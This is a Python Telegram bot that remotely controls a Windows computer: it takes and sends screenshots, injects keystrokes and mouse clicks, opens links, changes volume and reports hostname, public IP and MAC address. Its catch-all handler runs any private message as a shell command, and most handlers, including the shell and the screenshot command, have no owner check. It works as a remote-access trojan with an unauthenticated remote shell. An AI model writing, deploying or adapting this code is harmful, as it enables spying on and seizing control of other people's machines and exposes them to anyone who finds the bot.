import subprocess
import pyautogui
import io
import sys
import platform
import socket
import re
import uuid
import json
import psutil
import logging
import random
import os
import requests
import webbrowser
from pyrogram import Client, filters
from PIL import ImageGrab, Image
from io import BytesIO
from win10toast import ToastNotifier
import mouse
from pyrogram.types import Message, BotCommand, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
toaster = ToastNotifier()
app = Client("my_idiot")
global OWNER_ID
OWNER_ID = 1829043559
# Load the list of owners from a file
with open("owners.json", "r") as f:
    owners = json.load(f)
@app.on_message(filters.command(["delowner"]))
async def del_owner(client, message):
    id = message.from_user.id
    global owners
    text = message.text.split()
    global OWNER_ID
    if id == OWNER_ID:
        if len(text) == 1:
            # If the user didn't provide any arguments, send a message asking for them
            await message.reply("Please provide the ID or mention of the user you want to remove as owner.")
        else:
            # Get the user ID from the message text
            user_id = text[1]
            if not user_id.isdigit():
                # If the provided argument is not a number, try to extract the user ID from a mention
                user_id = message.entities[1].user.id
            user_id = int(user_id)
            # If user_id is None, the provided argument is invalid
            if user_id is None:
                await message.reply("Invalid user ID or mention.")
            else:
                # Remove the user from the owners list
                if user_id in owners:
                    owners.remove(user_id)
                    with open("owners.json", "w") as f:
                        json.dump(owners, f)
                    await message.reply(f"User {user_id} removed from owners list.")
                else:
                    await message.reply(f"User {user_id} is not an owner.")


# Define a filter to check if a user is an owner
def is_owner(message):
    return message.from_user.id in owners

@app.on_message(filters.command("addowner"))
def add_owner(client, message):
 if is_owner(message):
    user_id = None
    if message.reply_to_message:
        user_id = message.reply_to_message.from_user.id
    elif len(message.command) == 2:
        try:
            user_id = int(message.command[1])
        except ValueError:
            pass

    if user_id:
        if user_id not in owners:
            owners.append(user_id)
            with open("owners.json", "w") as f:
                json.dump(owners, f)
            message.reply(f"{user_id} has been added as an owner.")
        else:
            message.reply(f"{user_id} is already an owner.")
    else:
        message.reply("Please reply to a message from the user you want to add as an owner or provide a valid user ID.")

@app.on_message(filters.command("help"))
async def help_command(client, message):
    # Get a list of all the registered commands
    commands = await client.list_commands()

    # Create a string that lists all the available commands
    help_text = "Available commands:\n\n"
    for command in commands:
        help_text += f"/{command.command} - {command.description}\n"

    await message.reply(help_text)

@app.on_message(filters.command("restart"))
def restart(client, message):
 if is_owner(message):
    message.reply("Restarting...")
    os.execl(sys.executable, sys.executable, *sys.argv)
 else:
     message.reply("Нет прав для рестарта!!!")
@app.on_message(filters.command("bw"))
async def black_and_white_filter(client: Client, message: Message):
    # Check if the message contains a photo or a video
    if message.photo or message.video:
        # Download the media file
        file = await message.download()

        # Open the media file with Pillow
        with Image.open(file) as img:
            # Apply the black and white filter
            img = img.convert("L")

            # Save the modified image to memory
            with BytesIO() as buffer:
                img.save(buffer, format="PNG")
                buffer.seek(0)

                # Send the modified image back to the user
                await message.reply_photo(buffer)

        # Delete the downloaded file from disk
        os.remove(file)
    else:
        # If the message doesn't contain a photo or a video, let the user know
        await message.reply("Please send a photo or a video.")
@ app.on_message(filters.command("press"))
def press_key(client, message):
    keys = message.text.split()[1:]
    pyautogui.hotkey(*keys)
# eg /press q u a x  a l e r t
@app.on_message(filters.command(['rickroll']))
def press_rick(client, message):
    browser = webbrowser.get()
    browser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
    message.reply("Rickrolled OMG OMG OMG")
def get_ip():
    response = requests.get('https://api64.ipify.org?format=json').json()
    return response["ip"]

@app.on_message(filters.command(['pcinfo']))
def getSystemInfo(client, message):
        info={}
        info['platform']=platform.system()
        info['platform-release']=platform.release()
        info['platform-version']=platform.version()
        info['architecture']=platform.machine()
        info['hostname']=socket.gethostname()
        info['ip-address']=get_ip()
        info['mac-address']=':'.join(re.findall('..', '%012x' % uuid.getnode()))
        info['processor']=platform.processor()
        info['ram']=str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"
        json_str = json.dumps(info, separators=(',', ':'))

        # Remove brackets and double quotes
        result = json_str.replace('{', '').replace('}', '').replace('"', '')

        # Add newline character after each key-value pair
        result = result.replace(',', '\n')
        message.reply_text(result)

@app.on_message(filters.command(['web']))
async def open_link(_, message):
    try:
        # Get the link from the command argument
        link = message.text.split(' ')[1]

        # Check if the link starts with 'http://' or 'https://'
        if not link.startswith('http://') and not link.startswith('https://'):
            # If not, add 'https://' to the beginning of the link
            link = 'https://' + link

        # Get the user's default web browser
        browser = webbrowser.get()

        # Open the link in the user's default web browser
        browser.open(link)

        # Send a confirmation message to the user
        await message.reply_text(f"Opened {link} in your default web browser!")

    except IndexError:
        # If the user didn't provide a link in the command argument
        await message.reply_text("Please provide a link to open!")
@ app.on_message(filters.command("alert"))
def show_alert(client, message):

    text = " ".join(message.command[1:])
    sender_name = message.from_user.first_name
    toaster.show_toast(sender_name, text, duration=10)

async def get_media_messages(client, channel_username):
    messages = []
    async for message in client.iter_messages(channel_username, limit=1000):
        if message.media:
            messages.append(message)
    return messages

@ app.on_message(filters.command("close"))
def close_program(client, message):
    message.reply_text("Closing the program...")

    # Terminate the script using sys.exit
    sys.exit()
@app.on_message(filters.command("screenshot"))
def take_screenshot(client, message):
    # Take a screenshot of the entire screen
    screenshot = ImageGrab.grab()

    # Convert the screenshot to bytes
    buffer = io.BytesIO()
    screenshot.save(buffer, format="PNG")
    buffer.seek(0)

    # Send the screenshot to the user who invoked the command
    client.send_photo(
        chat_id=message.chat.id,
        photo=buffer,
        caption="тест"
    )


# Handler function for the media command
@app.on_message(filters.command("media"))
def media_command_handler(client, message):
    # Define the inline keyboard markup with the volume control buttons
    volume_control_markup = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("🔊 -10", callback_data="decrease_volume_10"),
            InlineKeyboardButton("🔇", callback_data="mute_volume"),
            InlineKeyboardButton("🔉", callback_data="unmute_volume"),
            InlineKeyboardButton("🔊 +10", callback_data="increase_volume_10")
        ]
    ])

    # Send the volume control buttons with a message
    client.send_message(
        message.chat.id,
        "Select a volume control option:",
        reply_markup=volume_control_markup
    )
@ app.on_message(filters.command("cursorm", prefixes="/"))
def move_cursor(client: Client, message: Message):
    direction = message.text.split()[1].lower()
    pixels = int(message.text.split()[2])
    if direction == "down":
        mouse.move(0, pixels, absolute=False, duration=0.1)
    elif direction == "up":
        mouse.move(0, -pixels, absolute=False, duration=0.1)
    elif direction == "right":
        mouse.move(pixels, 0, absolute=False, duration=0.1)
    elif direction == "left":
        mouse.move(-pixels, 0, absolute=False, duration=0.1)
    else:
        client.send_message(message.chat.id, "Invalid direction provided. Please use /cursor <direction> <pixels>")
# Handler function for the media command
@app.on_message(filters.command("cursor"))
def media_command_handler(client, message):
    # Define the inline keyboard markup with the volume control buttons
    cursor_control_markup = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("ЛКМ", callback_data="click"),
            InlineKeyboardButton("⬅", callback_data="left"),
            InlineKeyboardButton("⬆", callback_data="up"),
            InlineKeyboardButton("➡", callback_data="right"),
            InlineKeyboardButton("⬇", callback_data="down")
        ]
    ])

    # Send the volume control buttons with a message
    client.send_message(
        message.chat.id,
        "Cursor position:",
        reply_markup=cursor_control_markup
    )
@app.on_callback_query(filters.create(lambda _, __, query: query.data == "left"))
def r(client, callback_query):
    mouse.move(-450, 0, absolute=False, duration=0)

@app.on_callback_query(filters.create(lambda _, __, query: query.data == "right"))
def _handler(client, callback_query):
    mouse.move(450, 0, absolute=False, duration=0)

@app.on_callback_query(filters.create(lambda _, __, query: query.data == "up"))
def allback_handler(client, callback_query):
    mouse.move(0, -450, absolute=False, duration=0)

@app.on_callback_query(filters.create(lambda _, __, query: query.data == "down"))
def decrease_handler(client, callback_query):
    mouse.move(0, 450, absolute=False, duration=0)
@app.on_callback_query(filters.create(lambda _, __, query: query.data == "click"))
def decrease_vandler(client, callback_query):
    mouse.click()

# Handler functions for the volume control buttons
# Handler functions for the volume control buttons
@app.on_callback_query(filters.create(lambda _, __, query: query.data == "decrease_volume_10"))
def decrease_volume_callback_handler(client, callback_query):
    # Decrease the volume by 10 using the nircmd utility
    os.system("nircmd.exe changesysvolume -6553")

    # Send a confirmation message
    client.answer_callback_query(callback_query.id, "Volume decreased by 10.")




@app.on_callback_query(filters.create(lambda _, __, query: query.data == "mute_volume"))
def mute_volume_callback_handler(client, callback_query):
    # Mute the volume using the nircmd utility
    os.system("nircmd.exe mutesysvolume 1")

    # Send a confirmation message
    client.answer_callback_query(callback_query.id, "Volume muted.")

@app.on_callback_query(filters.create(lambda _, __, query: query.data == "unmute_volume"))
def mute_volume_callback_handler(client, callback_query):
    # Mute the volume using the nircmd utility
    os.system("nircmd.exe mutesysvolume 0")

    # Send a confirmation message
    client.answer_callback_query(callback_query.id, "Volume unmuted.")


@app.on_callback_query(filters.create(lambda _, __, query: query.data == "increase_volume_10"))
def increase_volume_callback_handler(client, callback_query):
    # Increase the volume by 10 using the nircmd utility
    os.system("nircmd.exe changesysvolume 6553")

    # Send a confirmation message
    client.answer_callback_query(callback_query.id, "Volume increased by 10.")


@app.on_message(filters.command("click"))
def uh(client, message):
    mouse.click()

@app.on_message(filters.command("volume"))
def volume_command_handler(client, message):
    # Parse the volume level from the command arguments
    try:
        volume_level = int(message.command[1])
    except (IndexError, ValueError):
        client.send_message(message.chat.id, "Please specify a valid volume level.")
        return
    nircmd_volume = int(volume_level * 655.35)
    # Set the system volume using the Windows command line
    subprocess.run(["nircmd.exe", "setsysvolume", str(nircmd_volume)])

    # Send a confirmation message
    client.send_message(message.chat.id, f"Volume set to {volume_level}%")
@ app.on_message(filters.private)
def run_command(client, message):
    command = message.text
    try:

        msg = client.send_message(message.chat.id, "Running command...")
        output = subprocess.check_output(command, shell=True)
        if len(output) > 4096:
            output = output[:4093] + b""
        if "/addowner" in message.text:
            print(0)
        if "shutdown" in command:
            print(msg)
            client.edit_message_text(chat_id=message.chat.id, message_id=msg.id, text="Чмо блять")
        else :
            print(msg)
            client.edit_message_text(chat_id=message.chat.id, message_id=msg.id, text=f"probably success \n {output.decode('cp866')}")
    except subprocess.CalledProcessError as e:
        print(msg)
        client.edit_message_text(chat_id=message.chat.id, message_id=msg.id, text=f"Command failed with error:\n{e}")

app.run()
